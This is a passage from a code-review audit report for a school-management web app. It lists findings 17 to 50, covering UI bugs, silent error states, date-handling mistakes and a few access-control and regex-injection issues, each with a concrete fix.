- **Location:** `src/app/(dashboard)/teacher/onboarding/page.tsx:65`
- **Failure:** A teacher on onboarding step 2 picks Grade 4 and Mathematics and presses "Next: Add Students". Step 3 loads and they realise they meant Grade 5 too, so they press Back, tick Grade 5, and press Next again. handleGradesSubjects re-runs over the full selection: a second 'Grade 4', a second 'Mathematics' with the same MAT code, and a second 'Grade 4 Class' are created alongside the new Grade 5 rows. From then on every grade and subject dropdown in the app shows each entry twice, and classByGradeId silently repoints at the duplicate class, so the learners added on step 3 land in the second copy.
- **Fix:** In handleGradesSubjects (src/app/(dashboard)/teacher/onboarding/page.tsx:62-95), reuse instead of recreate: before each createGrade, look for a case-insensitive name match in the `grades` array from useGrades() (and in createdGrades) and reuse its id; do the same for subjects against the fetched subject list and for classes against `classes` from useClasses(). Optionally guard the whole step with a `step2Committed` ref so a second Next is a no-op. Backend belt-and-braces: add a unique partial index on (schoolId, name, isDeleted:false) to gradeSchema in campusly-backend/src/modules/Academic/model.ts and upsert in GradeService.createGrade.

### 18. Teaching-scope picker ignores the hook's load error and can silently wipe a teacher's saved scope

- **Section:** n/a
- **Location:** `src/components/curriculum/TeachingScopePicker.tsx:81`
- **Failure:** A standalone teacher who has already configured Grades 4-7 across five subjects opens /teacher/settings. GET /teacher-settings/teaching-scope fails (500, or a token-refresh race). The spinner clears and the picker renders with every grade chip unselected — indistinguishable from a fresh account. Assuming their setup was lost, the teacher re-ticks Grade 4 and presses "Save scope". The PUT replaces the stored teachingScope with just that one grade and no subjects, and the materialise step re-derives their curriculum tree, paper generator and dashboards from the truncated scope. Their real scope is gone with no undo.
- **Fix:** In src/components/curriculum/TeachingScopePicker.tsx:81, destructure `error` and `refetch` from useTeachingScope, and after the loading branch at line 132 add an error branch that renders the message plus a "Try again" button calling refetch(). Also pass `disabled={saving || !!error}` on the Save scope button at line 145 so an unknown scope can never be committed as an empty one.

### 19. Student 360 has no teacher-ownership check — any teacher can pull any pupil's full record by ID

- **Section:** n/a
- **Location:** `campusly-backend/src/modules/TeacherWorkbench/routes.ts:255`
- **Failure:** A Grade 8 Maths teacher opens any pupil from /teacher/students, which redirects to /teacher/workbench/student-360/<id> (teacher/students/[id]/page.tsx:12). They then edit the id in the URL to any other 24-hex student ObjectId in the school and the page loads that pupil's mark history, attendance breakdown, disciplinary incidents and merit record even though they teach none of that pupil's classes. Nothing is written to the audit log.
- **Fix:** Attach a guard to routes.ts:255 that resolves the student's classId and reuses the Class/Timetable lookup from campusly-backend/src/middleware/teacherClassOwnership.ts (lines 28-38), bypassing for school_admin/super_admin and for req.user.isHOD. Apply the same treatment to Attendance/routes.ts:138 so the two surfaces are consistent.

### 20. Marking Hub "Due Today" is permanently 0 — a full ISO timestamp is string-compared against YYYY-MM-DD

- **Section:** n/a
- **Location:** `campusly-frontend/src/hooks/useMarkingHub.ts:38`
- **Failure:** A teacher with three homeworks due today (each with ungraded submissions) opens /teacher/workbench/marking-hub. The 'Due Today' StatCard reads 0 while the cards for those three homeworks are listed directly beneath it, so the teacher assumes nothing is urgent.
- **Fix:** In campusly-frontend/src/hooks/useMarkingHub.ts change both filters to compare `item.dueDate.slice(0, 10)`, or normalise `dueDate` to a local YYYY-MM-DD string in getPendingMarking (campusly-backend/src/modules/TeacherWorkbench/services/aggregation.service.ts:172) using local date parts rather than toISOString().

### 21. Workbench dashboard "Recent Activity" renders raw question documents — blank rows and "Invalid Date"

- **Section:** n/a
- **Location:** `campusly-backend/src/modules/TeacherWorkbench/services/aggregation.service.ts:106`
- **Failure:** A teacher who has saved any questions opens /teacher/workbench. The Recent Activity card renders up to 10 rows in which both text lines are empty and the right-hand timestamp reads 'Invalid Date', so the section looks like a rendering crash rather than a feed. A teacher with no questions sees the correct 'No recent activity.' fallback, so the bug only shows for active users.
- **Fix:** Map the documents inside getDashboard in campusly-backend/src/modules/TeacherWorkbench/services/aggregation.service.ts before returning: `recentActivity: recentActivity.map(q => ({ id: String(q._id), action: 'Question created', detail: q.questionText.slice(0, 80), timestamp: (q.createdAt as Date).toISOString() }))`, and type DashboardData.recentActivity accordingly instead of `unknown[]` (line 15).

### 22. Dashboard "Marking Due" and "Moderation" counts are school-wide, contradicting the teacher-scoped Marking Hub

- **Section:** n/a
- **Location:** `campusly-backend/src/modules/TeacherWorkbench/services/aggregation.service.ts:88`
- **Failure:** A teacher opens /teacher/workbench and reads 'Marking Due: 412 — Items needing marking' and 'Moderation: 9 — Papers awaiting moderation'. They click through to /teacher/workbench/marking-hub, which lists 6 items because that endpoint filters by teacherId. The dashboard's own StatCard description says the items need the teacher's marking, which is false.
- **Fix:** In campusly-backend/src/modules/TeacherWorkbench/services/aggregation.service.ts:88 and :101-105, scope both counts to the caller: reuse getPendingMarking's homeworkIds `$in` match for the submission count and add `submittedBy: teacherId` to the PaperModeration count — or relabel the StatCards in campusly-frontend/src/app/(dashboard)/teacher/workbench/page.tsx:58-69 as school-wide if that is the intent.

### 23. The workbench hub and most of its sub-pages are unreachable from navigation, and its headline action redirects out to a rival paper builder

- **Section:** n/a
- **Location:** `campusly-frontend/src/lib/constants.ts:295`
- **Failure:** A teacher's sidebar shows 'Term Planner' as the only workbench link. /teacher/workbench, /curriculum, /question-bank, /marking-hub and /papers/moderation are reachable only by typing a URL (student-360 is reachable, via the /teacher/students/[id] redirect). A teacher who does guess /teacher/workbench sees a Quick Actions grid with no link to Marking Hub or Question Bank, and its first card, 'Build Paper', immediately redirects to /teacher/papers. Meanwhile the sidebar exposes /teacher/curriculum/textbooks, and /teacher/curriculum/{questions,papers,mark-papers} also exist — so questions, papers and marking each have two entrances backed by different collections (WorkbenchQuestion vs QuestionBank Question), and a question filed in one is invisible in the other.
- **Fix:** Before ship, pick one entrance per capability. Either add the workbench children to TEACHER_NAV in campusly-frontend/src/lib/constants.ts (after line 295) and retire src/app/(dashboard)/teacher/curriculum/{questions,papers,mark-papers}, or delete the orphaned routes from src/lib/routes.ts:218-223 together with their pages and the now-unused workbench components. Also fix workbench/page.tsx:19-24 so 'Build Paper' points at the surface that actually survives.

### 24. Topic tree puts every topic under "Term 1" and the Grade filter is all-undefined — both read framework fields that don't exist in the schema

- **Section:** n/a
- **Location:** `campusly-frontend/src/components/workbench/curriculum/TopicTree.tsx:132`
- **Failure:** A teacher opens the Topic Tree for a subject whose topics span Terms 1-4. Because framework documents carry no `term`, the map lookup returns undefined for every framework and the `?? 1` fallback drops all topics into a single 'Term 1' accordion, hiding the term structure the data already has. Beside it, the Grade filter dropdown renders one blank option (key and value both undefined), so grade filtering is impossible.
- **Fix:** In campusly-frontend/src/components/workbench/curriculum/TopicTree.tsx:132-141 delete frameworkTermMap and group by `root.term` directly. In curriculum/page.tsx:173 source the grade options from the `classes` list already returned by useCurriculum (or a fixed 1-12 range) instead of `frameworks.map(f => f.gradeId)`. Remove `gradeId` and `term` from CurriculumFramework in src/types/teacher-workbench.ts:60-72 so the mismatch cannot recur.

### 25. Roster trash icon permanently deletes the learner record — no confirmation dialog

- **Section:** n/a
- **Location:** `src/components/classes/RosterStudentRow.tsx:84`
- **Failure:** A standalone teacher on a phone opens /teacher/classes/<id>/roster. Each row packs pencil, mail-or-key and trash ghost buttons into a compact row (RosterStudentRow.tsx:48-92). One mis-tap on the trash icon fires DELETE /students/:id with no prompt: the learner is soft-deleted out of every read path, their portal user is set isActive:false and their refreshTokens are cleared, logging them out mid-session. The toast says '{Learner} removed', implying removal from the class, and there is no undo in the UI.
- **Fix:** In src/app/(dashboard)/teacher/classes/[classId]/roster/page.tsx add a `deleteTarget` state and route RosterStudentRow's `onRemove` through the existing `<ConfirmDialog>` component (already imported and used in teacher/classes/page.tsx:172), naming the learner and saying the action deletes their record and portal access. If 'remove from this class' is the intended semantic, call the existing `reassignStudent` (useTeacherClasses.ts:204) instead of DELETE.

### 26. Add Students dialog has no scrollable body — violates the mandated dialog pattern and spills form fields off-screen on mobile

- **Section:** n/a
- **Location:** `src/components/classes/StudentAddDialog.tsx:241`
- **Failure:** Teacher on a 360x640 phone taps 'Add Learners'. The manual tab stacks 10 single-column fields plus the delivery-mode toggle and help text inside a popup capped at ~608px with `overflow-visible` and no scroll container. The lower fields (home language, SA ID, LURITS, etc.) render outside the popup and past the bottom of the viewport, and because DialogContent is `fixed top-1/2 left-1/2 -translate-y-1/2` (ui/dialog.tsx:56) nothing scrolls — the teacher can submit but cannot reach or correct those fields.
- **Fix:** In src/components/classes/StudentAddDialog.tsx wrap the Tabs body in `<div className="flex-1 min-h-0 overflow-y-auto">`, drop `overflow-visible` from lines 241/255/282 and the `min-h-[25rem]` floor on line 248 — matching the pattern used by AttendanceDayEditDialog.tsx:40-44 and RegenerateCredentialsDialog.tsx (`flex flex-col max-h-[85vh]` + `flex-1 overflow-y-auto`).

### 27. Attendance report "Student Patterns" dropdown renders blank rows — student names are not on the Student document

- **Section:** n/a
- **Location:** `src/app/(dashboard)/teacher/attendance/report/page.tsx:211`
- **Failure:** A homeroom teacher opens /teacher/attendance/report and opens the 'Student Patterns' select. Below 'Select a student…' there is one blank, unlabelled row per learner in the homeroom — no name, no admission number — so there is no way to choose a specific learner and the per-student absence-pattern card is unusable.
- **Fix:** In src/app/(dashboard)/teacher/attendance/report/page.tsx import `getStudentDisplayName` from '@/lib/student-helpers' and render `{getStudentDisplayName(s).full}` (optionally with `s.admissionNumber` as secondary text), exactly as RosterStudentRow.tsx:33 and AttendanceHistoryTab.tsx:211 already do.

### 28. Attendance history grid hides load failures and renders "no record" dashes while loading

- **Section:** n/a
- **Location:** `src/components/attendance/AttendanceHistoryTab.tsx:76`
- **Failure:** Teacher opens the History tab or steps back a week. While the GET is in flight — and permanently if it 500s or the refresh race fails — every cell shows '–' and every learner and the Class % row show 0%. That is pixel-identical to 'no register was ever taken this week', so the teacher may re-take and overwrite a week of attendance that actually exists on the server.
- **Fix:** Destructure `error` in AttendanceHistoryTab.tsx:76, render a skeleton (or the existing LoadingSpinner) in place of the table while `loading`, and when `error` is set show a `bg-destructive/10 text-destructive` banner with a Retry button calling `refresh()` instead of the all-dashes grid.

### 29. Teacher policies page cannot acknowledge anything and its View button routes teachers into an admin page that 403s

- **Section:** n/a
- **Location:** `src/app/(dashboard)/teacher/policies/page.tsx:29`
- **Failure:** A teacher opens /teacher/policies (by URL — see the dead-route finding), sees the active child-safety policy listed, and clicks View. She lands on /admin/governance/policies/<id>, an admin-namespaced URL, where the Detail and Version History tabs render but the 'Acknowledgements' tab is permanently empty because GET /governance/policies/:id/acknowledgements 403s for role teacher. Nowhere in either screen is there a control to acknowledge the policy, even though POST /governance/policies/:id/acknowledge is open to teachers and the page header promises 'View and acknowledge school policies'. Staff policy-acknowledgement compliance can never be recorded.
- **Fix:** Add a teacher-owned detail route at src/app/(dashboard)/teacher/policies/[id]/page.tsx that renders `PolicyDetailView` plus the orphaned `PolicyAcknowledgeButton` wired to `acknowledgePolicy` from useGovernancePolicies (src/hooks/useGovernancePolicies.ts:85), and change the onView push at teacher/policies/page.tsx:29 to that route instead of /admin/*.

### 30. Counseling session date defaults to yesterday for early-morning entries (toISOString UTC bug in SA/UTC+2)

- **Section:** n/a
- **Location:** `src/components/pastoral/SessionCreateDialog.tsx:59`
- **Failure:** A counselor writes up an after-hours crisis session at 01:15 SAST on 2026-07-30. `new Date().toISOString()` yields 2026-07-29T23:15Z, so the Session Date field pre-fills as 2026-07-29. Unless she notices and corrects it, the session is filed against the previous day. That mis-dated sessionDate then flows into the 'sessions this week' and 'sessions this month' counters in CaseloadService (service-caseload.ts:53-67, which bucket on sessionDate) and into the sessions_monthly report chart, which can land the session in the wrong month at a month boundary.
- **Fix:** Replace todayInputValue() in src/components/pastoral/SessionCreateDialog.tsx:59-61 with the local-parts version already used at src/app/(dashboard)/teacher/leave/page.tsx:56-61: `const d = new Date(); return `${d.getFullYear()}-${String(d.getMonth()+1).padStart(2,'0')}-${String(d.getDate()).padStart(2,'0')}`;` — better still, extract it to src/lib/ as a shared `toLocalISODate()` since the leave page duplicates it.

### 31. Pastoral reports From/To date pickers are collapsed to a single calendar year — the selected range is ignored

- **Section:** n/a
- **Location:** `src/hooks/usePastoralCare.ts:14`
- **Failure:** A counselor preparing a March board pack goes to /teacher/pastoral → Reports, sets From = 2026-03-01 and To = 2026-03-31, and clicks Generate Report. endDate is discarded entirely and startDate is reduced to `year=2026`, so all three charts (Referral Reasons, Sessions per Month, Outcomes) return the full 2026-01-01 to 2026-12-31 aggregate. Nothing in the UI indicates the range was ignored, so she presents twelve months of referral reasons and outcomes to the board labelled as March.
- **Fix:** Simplest correct fix: replace the two date Inputs at src/app/(dashboard)/teacher/pastoral/page.tsx:248-265 with a year Select and pass `{ year }` through, matching the backend contract. If a true range is wanted, extend `reportQuerySchema` in campusly-backend/src/modules/Pastoral/validation.ts:95 with optional startDate/endDate and change service-reports.ts to bucket on them instead of `new Date(year,0,1)`/`new Date(year+1,0,1)`.

### 32. 'View' button on the teacher referral list is a no-op callback

- **Section:** n/a
- **Location:** `src/app/(dashboard)/teacher/referral/page.tsx:54`
- **Failure:** A teacher who reached /teacher/referral (by URL today, or via the sidebar once the missing nav entry is added) wants to check what the counselor did with the self-harm referral she filed last week. Her referral is listed with a 'View' button in the Actions column. Clicking it does nothing at all — no drawer opens, no navigation, no toast, no console output. The counselorNotes, outcome and resolutionNotes fields are already present in the fetched payload but are never rendered anywhere, so the referring teacher gets no feedback loop on a safeguarding referral.
- **Fix:** In src/app/(dashboard)/teacher/referral/page.tsx add `const [selected, setSelected] = useState<PastoralReferral | null>(null)`, change line 54 to `onView={setSelected}`, and render `{selected && <ReferralDetailDrawer referral={selected} />}` below the table — omitting onAcknowledge/onResolve keeps it read-only, which ReferralDetailDrawer.tsx:255-268 already handles correctly.

### 33. Incident list treats a failed fetch as 'no incidents' — no error state anywhere in the incidents view

- **Section:** n/a
- **Location:** `src/hooks/useIncidents.ts:60`
- **Failure:** The school admin disables the `incident_wellbeing` module (requireModule returns 403 at campusly-backend/src/app.ts:197), or the API is briefly unreachable. A teacher opens /teacher/incidents; GET /api/incidents fails, useIncidents.ts:61 writes one line to the browser console, and `incidents` stays []. The page renders a confident 'No incidents — No incidents match your filters.' The teacher concludes nothing has been reported at the school, when incidents exist and simply were not retrieved. There is no error banner and no Retry affordance, so her only recovery is a full page reload.
- **Fix:** Add `const [error, setError] = useState<string | null>(null)` to src/hooks/useIncidents.ts, set it in the fetchIncidents catch at line 60 (and clear it on success), export it, and in src/app/(dashboard)/teacher/incidents/page.tsx render a distinct error state with a Retry button that calls loadData() — the same `configError`/`retryConfig` pattern already used in src/app/(dashboard)/teacher/timetable/page.tsx.

### 34. Teachers have no UI to create quizzes, study materials or rubrics — the only CRUD surface is /admin/learning

- **Section:** n/a
- **Location:** `c:/Users/shaun/campusly-frontend/src/components/lessons/drawers/QuizDrawer.tsx:100`
- **Failure:** A school (non-standalone) teacher building a lesson opens the Quiz drawer with no quizzes yet, sees 'Create a quiz in the Learning module first, then come back here to link it', clicks 'Go to Learning', and lands on /teacher/learning which offers only Submissions and Struggling Students — no create action. Same teacher opens a submission to grade and the rubric select in SubmissionViewer (:170) is empty because rubrics can only be authored at /admin/learning, so rubric-based grading cannot be used without an admin.
- **Fix:** Either add Quizzes / Materials / Rubrics tabs to c:/Users/shaun/campusly-frontend/src/app/(dashboard)/teacher/learning/page.tsx reusing the existing QuizBuilderDialog, MaterialUploadDialog and RubricEditorDialog from components/learning (the backend already authorizes 'teacher' on POST /learning/quizzes, /materials and /rubrics), or change the QuizDrawer.tsx:96-105 empty state to point at a surface a teacher can actually act on. Do NOT add /teacher/learning to isStandaloneTeacherPathAllowed — the standalone branch at QuizDrawer.tsx:85-95 already handles that cohort correctly.

### 35. Teacher quiz picker's teacherId filter is silently dropped by the backend, so it lists every quiz in the school

- **Section:** n/a
- **Location:** `c:/Users/shaun/campusly-backend/src/modules/Learning/controller.ts:23`
- **Failure:** In a multi-teacher school, Teacher A opens a lesson and the Quiz drawer. The request goes out as /learning/quizzes?status=published&teacherId=<A>, but the controller drops teacherId, so the picker lists every published quiz in the school across all teachers and subjects. Teacher A links Teacher B's quiz into their lesson with no indication the list was unfiltered.
- **Fix:** Add `teacherId: req.query.teacherId as string | undefined,` to the query object in LearningController.listQuizzes (c:/Users/shaun/campusly-backend/src/modules/Learning/controller.ts:23-32) — quiz.service.ts:70 already applies it. Fix this in the same edit as the schoolId-override finding, since both live in that object.

### 36. Teacher learning page: fixed-width selects overflow on mobile and there is no error state on any data view

- **Section:** n/a
- **Location:** `c:/Users/shaun/campusly-frontend/src/hooks/useLearningApi.ts:258`
- **Failure:** Teacher selects a homework on /teacher/learning while the backend returns 500 or 403 from GET /learning/assignments/:id/submissions. The catch at useLearningApi.ts:259 logs to console only, submissionsLoading flips false and submissions stays [], so page.tsx:141-142 renders the 'No Submissions' EmptyState. The teacher concludes nobody submitted and moves on. Identical behaviour on the Struggling Students tab via fetchStrugglingStudents.
- **Fix:** In c:/Users/shaun/campusly-frontend/src/hooks/useLearningApi.ts, replace the bare `catch {}` at :258 and :330 with `catch (err: unknown) { toast.error(extractErrorMessage(err, 'Failed to load submissions')); setSubmissionsError(true); }` and add submissionsError/strugglingError to src/stores/useLearningStore.ts, then branch on it in page.tsx:137-145 with a retry button distinct from the EmptyState. While in the file, change page.tsx:122 and :152 to `className="w-full sm:w-64"` and :115 to `flex flex-col sm:flex-row gap-3` for rule compliance.

### 37. Report Comment Generator has no empty state and no loading state for the saved-comments list

- **Section:** n/a
- **Location:** `c:/Users/shaun/campusly-frontend/src/components/ai-tutor/ReportCommentGenerator.tsx:171`
- **Failure:** Teacher opens /teacher/ai-tools/report-comments and picks a class + subject. The effect at :69-73 fires GET /ai-tutor/report-comments; for the whole round trip the page shows the form and blank space below it. If the class/subject/term has no saved comments, that blank space is also the final state — the teacher cannot distinguish 'still loading' from 'nothing saved yet' and may hit Generate a second time, spending another batch of Anthropic calls.
- **Fix:** Destructure `loadingComments` from useReportComments in c:/Users/shaun/campusly-frontend/src/app/(dashboard)/teacher/ai-tools/report-comments/page.tsx:11-20, pass it into ReportCommentGenerator as a prop, and at ReportCommentGenerator.tsx:171 render `<LoadingSpinner />` while loading, the existing list when comments.length > 0, and `<EmptyState icon={Sparkles} title="No saved comments" description="Generate comments for this class, subject and term to get started." />` once a fetch has completed empty.

### 38. Duplicating a lesson marks every copied material as an ungenerated placeholder and hides its content

- **Section:** n/a
- **Location:** `campusly-frontend/src/components/lessons/LessonMaterialCard.tsx:99`
- **Failure:** Teacher opens /teacher/lessons, uses the row menu → Duplicate on a fully generated lesson, gets the 'Lesson duplicated' toast, and opens the copy. Every material card renders amber with the 'Needs generating' badge and no View button, so the copied worksheet/notes/practice questions cannot be previewed — while the Generate-all banner above reports nothing to generate (it returns null because its ref-aware isPlaceholder finds zero placeholders). The teacher's only visible action is 'Generate now', which re-runs paid AI generation over content that was already copied.
- **Fix:** In campusly-frontend/src/components/lessons/LessonMaterialCard.tsx, replace `const isPlaceholder = !material.generatedAt;` with the same ref-aware predicate used by LessonGenerateAllBanner.tsx:50-72 (extract it into a shared helper, e.g. src/lib/lesson-materials.ts, and import it in both) — or have cloneLesson in campusly-backend/src/modules/Lesson/service-clone.ts:79 carry `generatedAt: m.generatedAt` across for materials whose external refs were preserved.

### 39. Same-phase drag reorder is off by one, and dragging a card onto the card directly below it is a silent no-op

- **Section:** n/a
- **Location:** `campusly-frontend/src/app/(dashboard)/teacher/lessons/[id]/page.tsx:99`
- **Failure:** In a lesson workspace phase containing cards [A,B,C,D]: (1) the teacher drags A onto B — targetIndex resolves to 1, is decremented to 0, `currentIdx === targetIndex` returns early, the card snaps back and no request is sent, with no feedback. (2) The teacher drags A onto C — targetIndex 2 is decremented to 1; the backend removes A giving [B,C,D] and inserts at 1, yielding [B,A,C,D] instead of the expected [B,C,A,D]. Every downward reorder within a phase lands one slot too high.
- **Fix:** In campusly-frontend/src/app/(dashboard)/teacher/lessons/[id]/page.tsx, delete the `if (currentIdx >= 0 && targetIndex > currentIdx) { targetIndex -= 1; }` block (lines 99-101) and change the no-op guard to compare against the post-removal position, e.g. `const postRemoval = currentIdx >= 0 && targetIndex > currentIdx ? targetIndex : targetIndex; if (currentIdx === targetIndex) return;` — i.e. only bail when the raw over-index equals currentIdx.

### 40. PDF and PPTX export failures are completely silent — no catch, no toast, no error state

- **Section:** n/a
- **Location:** `campusly-frontend/src/hooks/useLessonExport.ts:8`
- **Failure:** Teacher opens a lesson workspace → Actions → 'Export Teacher Pack (PDF)'. If the server-side render throws (a material with unrenderable content, pptxgenjs failure, or any 5xx), the button shows 'Working...' then reverts to 'Download' with no file downloaded, no toast, and no message. The same click repeats identically. Because the request uses responseType:'blob', even the axios error body is an opaque Blob, so nothing is logged that the teacher or support can act on.
- **Fix:** In campusly-frontend/src/hooks/useLessonExport.ts, add `catch (err: unknown)` to both `download` and `downloadSlides`; for the blob path read the server message via `const text = await (err as AxiosError).response?.data?.text?.()` then `toast.error(JSON.parse(text)?.message ?? 'Export failed')` using the sonner toast already imported elsewhere in the hooks layer.

### 41. Calendar view can only ever show the currently-filtered month — prev/next navigation renders an empty grid

- **Section:** n/a
- **Location:** `campusly-frontend/src/components/lessons/LessonCalendar.tsx:31`
- **Failure:** A teacher with more than 20 lessons opens the Calendar tab. useLessons requested `limit: 20` sorted by updatedAt desc, so only the 20 most recently touched lessons can ever appear — older months render as an empty 42-cell grid with no message. Navigating with the ‹ / › chevrons or the Month/Year selects changes the header label but issues no new request, so the missing lessons never load. The same happens after arriving from a '+N more' link (which sets dateFrom=dateTo in the URL, page.tsx:52-61): the calendar then holds a single day's lessons while the teacher can still page to any other month and see nothing.
- **Fix:** Add an `onPeriodChange(from: string, to: string)` prop to campusly-frontend/src/components/lessons/LessonCalendar.tsx, call it from stepBy/handleMonthSelect/handleYearSelect, and have page.tsx (line 175) push those into `setFilters` with a limit that covers the visible grid; also render an explicit 'No lessons scheduled in this period' block when every cell's `entries` array is empty.

### 42. Subject filter silently returns zero lessons — LessonService.list has no ID-flavour fallback despite the page's comment claiming one

- **Section:** n/a
- **Location:** `campusly-backend/src/modules/Lesson/service.ts:43`
- **Failure:** A school-based teacher (whose school has academic Subject documents) opens /teacher/lessons and picks 'Mathematics' from the Subject dropdown. Because academic subjects are pushed into the merged list first (page.tsx:95-100) and CAPS subjects are deduped out by lowercase name (lines 101-106), the selected id is the academic Subject _id — which never equals the CurriculumNode subject id stored on every lesson created through the New Lesson wizard. The list empties out and shows 'No lessons match these filters'. The Subject filter therefore never returns results for wizard-created lessons at such a school.
- **Fix:** In campusly-backend/src/modules/Lesson/service.ts:43, import `resolveSubjectOrGradeIds` from ../CurriculumStructure/service-academic-bridge.js and filter with `query.subjectId = { $in: resolvedIds }` (handling the undefined/null return convention documented at service-academic-bridge.ts:64-78); alternatively stop merging namespaces in campusly-frontend/src/app/(dashboard)/teacher/lessons/page.tsx:92-108 and expose only the CAPS flavour, and delete the false comment at lines 88-91.

### 43. Scaffold preview lets teachers create 6-10 objectives (or delete them all), which the backend rejects — losing every edit

- **Section:** n/a
- **Location:** `campusly-frontend/src/components/lessons/LessonScaffoldPreview.tsx:30`
- **Failure:** Teacher runs New Lesson → Scaffold with AI → on step 3 clicks 'Add' under Learning Objectives (the button stays enabled up to 10) and either leaves the new row blank or fills in a 6th objective, then clicks 'Create Lesson'. The POST /lessons 400s and onCreate's catch toasts the raw Zod message ('Too big: expected array to have <=5 items' / 'Too small'), the wizard sits on step 3, and no lesson is created. Deleting every objective produces the same dead end while the UI cheerfully shows 'No objectives yet — add one.'
- **Fix:** In campusly-frontend/src/components/lessons/LessonScaffoldPreview.tsx set `const MAX_OBJECTIVES = 5;` to match scaffoldedOutlineSchema (campusly-backend/src/modules/Lesson/validation.ts:44), and in new/page.tsx's `onCreate` strip blank rows (`objectives: finalOutline.objectives.map(o => o.trim()).filter(Boolean)`) plus disable the Create button when the resulting list is empty.

### 44. Lesson search passes raw user input into a MongoDB $regex — invalid patterns 500 the list, and pathological ones are a ReDoS vector

- **Section:** n/a
- **Location:** `campusly-backend/src/modules/Lesson/service.ts:63`
- **Failure:** Teacher types a normal lesson title into the search box — 'C++', 'Maths (Gr 8', or '3*'. The un-debounced input fires a request per keystroke; the moment the partial string is an invalid regex (e.g. 'C++' → 'nothing to repeat', or an unbalanced '('), MongoDB throws and GET /api/lessons 500s. useLessons swallows it into `error`, which the page never renders, so the teacher sees the empty state instead of their lessons and has no idea why.
- **Fix:** In campusly-backend/src/modules/Lesson/service.ts:63, escape before building the pattern: `const safe = filters.search.replace(/[.*+?^${}()|[\]\\]/g, '\\$&'); query.title = { $regex: safe, $options: 'i' };` and debounce the Input in campusly-frontend/src/components/lessons/LessonListFilters.tsx:40-45 by ~300ms.

### 45. The lessons list never renders its error state — API failures are indistinguishable from having no lessons

- **Section:** n/a
- **Location:** `campusly-frontend/src/app/(dashboard)/teacher/lessons/page.tsx:148`
- **Failure:** The backend is down, requireModule('academic') is disabled for the school (app.ts:168 gates /api/lessons on it), or the search regex 500s. The teacher lands on /teacher/lessons and sees 'No lessons yet — Create your first lesson to get started.' with no error, no retry, and no indication their library still exists. A teacher who trusts that message will start recreating lessons that are still on the server.
- **Fix:** Destructure `error` from useLessons in campusly-frontend/src/app/(dashboard)/teacher/lessons/page.tsx:45 and add a branch ahead of the empty-state check inside both TabsContent blocks: `{error ? <EmptyState icon={AlertTriangle} title="Couldn't load lessons" description={error} action={<Button variant="outline" onClick={() => void refetch()}>Retry</Button>} /> : ...}` (refetch is already exported at useLessons.ts:88).

### 46. The material drawer closes before the AI call runs, so a failed generation discards the entire form

- **Section:** n/a
- **Location:** `campusly-frontend/src/components/lessons/drawers/MaterialDrawer.tsx:49`
- **Failure:** Teacher clicks 'Add material' in the Assessment phase, picks Paper, chooses 'Create new', sets paper type, total marks, duration, topic hint and three custom sections, then clicks Create. The drawer closes immediately, the busy modal spins for 30-60s, the AI paper generation fails (provider 5xx or rate limit), the modal disappears, useLesson toasts 'Failed to add material' — and the drawer is gone with every field back to defaults. Identical for Homework, Practice Questions and the four content-backed drawers.
- **Fix:** In campusly-frontend/src/components/lessons/drawers/MaterialDrawer.tsx, capture `const { phase, kind, materialId } = drawer` before `closeDrawer()`, wrap the await in `catch (err: unknown)` and call `openDrawer(phase, kind, materialId)` on failure; to preserve the field values, hoist each drawer's form state into useLessonWorkspaceStore (src/stores/useLessonWorkspaceStore.ts) keyed by kind so remounting restores it.

### 47. Lesson chat breaks permanently after 40 messages — the client sends unbounded history against a max(40) schema

- **Section:** n/a
- **Location:** `campusly-frontend/src/hooks/useLessonChat.ts:44`
- **Failure:** Teacher works with the lesson assistant in the workspace side-rail. On the 21st exchange the prior conversation is 40 messages, so the 41st entry trips `.max(40)` and POST /lessons/:id/chat 400s. useLessonChat catches it and appends 'Sorry — the assistant is unavailable right now (Request failed with status code 400).' Every subsequent message fails the same way because history only grows; the only escape is Clear (which discards the conversation) or a reload.
- **Fix:** In campusly-frontend/src/hooks/useLessonChat.ts:44, send only what the server uses: `const historySnapshot = messages.slice(-10);` (matching MAX_HISTORY_TURNS in campusly-backend/src/modules/Lesson/service-chat.ts:29), and clamp each entry's content length client-side.

### 48. "Assign to a class" is disabled and mislabeled "All classes assigned" while classes are loading or when the teacher has none

- **Section:** n/a
- **Location:** `campusly-frontend/src/components/lessons/LessonAssignedClasses.tsx:152`
- **Failure:** Teacher opens a lesson workspace. While GET /academic/teacher/me/teaching-load is in flight — and permanently if it fails (useTeacherClasses toasts 'Could not load classes. Please refresh.' and leaves entries empty) or if the teacher has no classes on their timetable yet — the only control for scheduling the lesson is greyed out and reads 'All classes assigned', immediately below text telling them to assign it to a class. Since scheduling is also what unlocks homework auto-generation in the Generate-all banner ([id]/page.tsx:117), the teacher is blocked with a false explanation.
- **Fix:** In campusly-frontend/src/components/lessons/LessonAssignedClasses.tsx:69 destructure `const { classes, loading } = useTeacherClasses();` and drive the trigger through three states: `loading` → disabled, label 'Loading classes…'; `classes.length === 0` → disabled, label 'No classes yet' with a link to the timetable; `availableClasses.length === 0` → 'All classes assigned'.

### 49. mustChangePassword is never loaded into the client, so temporary passwords are never forced to rotate for teachers

- **Section:** n/a
- **Location:** `campusly-frontend/src/components/auth/AuthProvider.tsx:32`
- **Failure:** An admin adds a teacher on /admin/staff → POST /api/staff → the response shows a random tempPassword which the admin emails or reads out. The teacher signs in with it and is taken straight to /teacher; nothing ever asks them to change it, because Staff/controller.ts never set mustChangePassword and, even if it had, AuthProvider drops the field when hydrating from /auth/me and MustChangePasswordGate is only mounted under app/(dashboard)/student/layout.tsx. The shared temporary password stays valid indefinitely.
- **Fix:** Set `mustChangePassword: true` in the userData object in campusly-backend/src/modules/Staff/controller.ts (alongside the crypto.randomBytes password); add `mustChangePassword: userData.mustChangePassword === true` to the User mappings in campusly-frontend/src/components/auth/AuthProvider.tsx and both mappings in src/hooks/useAuth.ts; and move <MustChangePasswordGate> from app/(dashboard)/student/layout.tsx up into app/(dashboard)/layout.tsx so it covers the teacher subtree.

### 50. Teacher Workbench hub, marking hub, question bank and moderation pages have no nav entry and zero inbound links

- **Section:** n/a
- **Location:** `campusly-frontend/src/lib/constants.ts:295`
- **Failure:** A teacher wants the consolidated marking queue. The sidebar shows 'Term Planner' (→ /teacher/workbench/planner) but the planner page links nowhere back to the hub, and no sidebar, bottom-nav or in-page link anywhere in the app points at /teacher/workbench, /teacher/workbench/marking-hub, /teacher/workbench/question-bank or /teacher/workbench/papers/moderation. Unless the teacher types the URL, those four screens ship invisible; a standalone teacher who does type the URL is bounced to /teacher by the isStandaloneTeacherPathAllowed effect in app/(dashboard)/layout.tsx.
